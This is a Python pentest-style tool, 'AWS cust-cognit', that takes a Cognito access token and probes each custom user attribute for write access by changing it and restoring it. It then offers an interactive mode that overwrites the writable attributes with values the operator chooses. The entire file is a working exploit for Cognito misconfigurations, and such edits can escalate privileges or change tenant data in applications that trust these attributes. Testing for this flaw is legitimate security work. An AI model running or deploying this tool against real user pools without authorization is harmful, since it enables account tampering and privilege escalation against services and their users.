import boto3
import random
import argparse
import string
import uuid
import sys
import jwt
import json
import requests
from termcolor import colored
from art import *

valid_aws_regions = {
    'us-east-2': 'Ohio',
    'us-east-1': 'N. Virginia',
    'us-west-1': 'N. California',
    'us-west-2': 'Oregon',
    'ap-east-1': 'Hong Kong',
    'ap-south-1': 'Mumbai',
    'ap-northeast-3': 'Osaka-Local',
    'ap-northeast-2': 'Seoul',
    'ap-southeast-1': 'Singapore',
    'ap-southeast-2': 'Sydney',
    'ap-northeast-1': 'Tokyo',
    'ca-central-1': 'Central',
    'cn-north-1': 'Beijing',
    'cn-northwest-1': 'Ningxia',
    'eu-central-1': 'Frankfurt',
    'eu-west-1': 'Ireland',
    'eu-west-2': 'London',
    'eu-west-3': 'Paris',
    'eu-north-1': 'Stockholm',
    'me-south-1': 'Bahrain',
    'sa-east-1': 'São Paulo'
}


def is_valid_guid(guid_string):
    try:
        uuid.UUID(guid_string)
        return True
    except ValueError:
        return False


def update_cognito_custom_attribute(access_token, aws_region, attribute_name, attribute_value):
    headers = {
        'Authorization': access_token,
        'Content-Type': 'application/x-amz-json-1.1',
        'X-Amz-Target': 'AWSCognitoIdentityProviderService.UpdateUserAttributes'
    }
    body = {
        'AccessToken': access_token,
        'UserAttributes': [
            {
                'Name': attribute_name,
                'Value': attribute_value
            }
        ]
    }

    response = requests.post(
        f'https://cognito-idp.{aws_region}.amazonaws.com/',
        headers=headers,
        data=json.dumps(body)
    )

    if response.status_code == 200:
        return True
    else:
        return False


def exploit_custom_attributes(access_token, aws_region, editable_attributes):
    while True:
        for i, attribute in enumerate(editable_attributes, 1):
            print(f"{i}. {attribute}")

        selected_value = int(input("\nPlease select an attribute from the list you wish to change: "))
        if not (1 <= selected_value <= len(editable_attributes)):
            print('Selected value not valid')
            continue

        attribute_to_change = editable_attributes[selected_value - 1]
        new_value = input(f"\nEnter new value for {attribute_to_change}: ")
        updated = update_cognito_custom_attribute(access_token, aws_region, attribute_to_change, new_value)

        if updated:
            print(colored(f'{attribute_to_change} successfully changed', 'green', attrs=['bold']))
        else:
            print(colored(f'{attribute_to_change} not successfully changed', 'red', attrs=['bold']))

        user_input = input("\nDo you want to make other changes to vulnerable attributes? (y/n) ").lower()

        if user_input in ["y", "Y", "yes"]:
            continue
        elif user_input in ["n", "N", "no"]:
            sys.exit()


def main(access_token, aws_region):
    if not aws_region and (aws_region.lower() not in valid_aws_regions):
        sys.exit(colored("AWS region not valid", 'red', attrs=['bold']))

    try:
        cognito_client = boto3.client("cognito-idp", region_name=aws_region)

        try:
            decoded_token = jwt.decode(access_token, algorithms=['RS256'], options={"verify_signature": False})
        except:
            sys.exit(colored("Access token is not valid JWT format", 'red', attrs=['bold']))

        user = cognito_client.get_user(AccessToken=access_token)
        username = user["Username"]
        user_pool_id = decoded_token['iss'].split('/')[-1]
        email_address = [item['Value'] for item in user["UserAttributes"] if item['Name'] == 'email'][0]

        print("Email address: {}".format(colored(email_address, 'blue', attrs=['bold'])))
        print("Username: {}".format(colored(username, 'blue', attrs=['bold'])))
        print("AWS Region: {}".format(colored(f'{aws_region.lower()} ({valid_aws_regions[aws_region]})', 'blue', attrs=['bold'])))
        print("User pool ID: {}\n".format(colored(user_pool_id, 'blue', attrs=['bold'])))

        custom_attributes = [{attr['Name']: attr['Value']} for attr
                             in user["UserAttributes"]
                             if attr['Name'].startswith('custom:')]

        if not custom_attributes:
            sys.exit(colored("No custom attributes detected", 'green', attrs=['bold']))

        editable_attributes = []
        for custom_attribute in custom_attributes:
            for key, value in custom_attribute.items():

                if value.isdigit():
                    new_value = str(random.randint(1, 9))
                elif is_valid_guid(value):
                    new_value = str(uuid.uuid4())
                else:
                    new_value = ''.join(random.choices(string.ascii_letters + string.digits, k=len(value)))

                try:
                    value_changed = update_cognito_custom_attribute(access_token, aws_region, key, new_value)
                    returned_to_original_value = update_cognito_custom_attribute(access_token, aws_region, key, value)

                    if value_changed and returned_to_original_value:
                        editable_attributes.append(key)
                        print("{} -> {}".format(custom_attribute, colored('Vulnerable - custom attribute editable', 'red', attrs=['bold'])))
                    else:
                        print("{} -> {}".format(custom_attribute, colored('Not vulnerable - custom attribute not editable', 'green', attrs=['bold'])))

                except cognito_client.exceptions.NotAuthorizedException as e:
                    print(e)
                    error_message = str(e).rsplit(':', 1)[-1]
                    sys.exit(f"\nAWS Cognito authorization error: {colored(error_message, 'red', attrs=['bold'])}")

        if editable_attributes:
            user_input = input("\nDo you want to change editable vulnerable attributes value? (y/n) ").lower()

            if user_input in ["y", "Y", "yes"]:
                exploit_custom_attributes(access_token, aws_region, editable_attributes)
            elif user_input in ["n", "N", "no"]:
                sys.exit()

    except Exception as e:
        print(e)
        sys.exit(colored("\nError during execution", 'red', attrs=['bold']))


if __name__ == '__main__':
    tprint("AWS  cust-cognit\n")

    parser = argparse.ArgumentParser()

    parser.add_argument("--access_token", type=str, required=True, help="Access token for AWS Cognito")
    parser.add_argument("--aws_region", type=str, required=True, help="AWS region to use")

    args = parser.parse_args()

    access_token = args.access_token
    aws_region = args.aws_region

    main(access_token, aws_region)
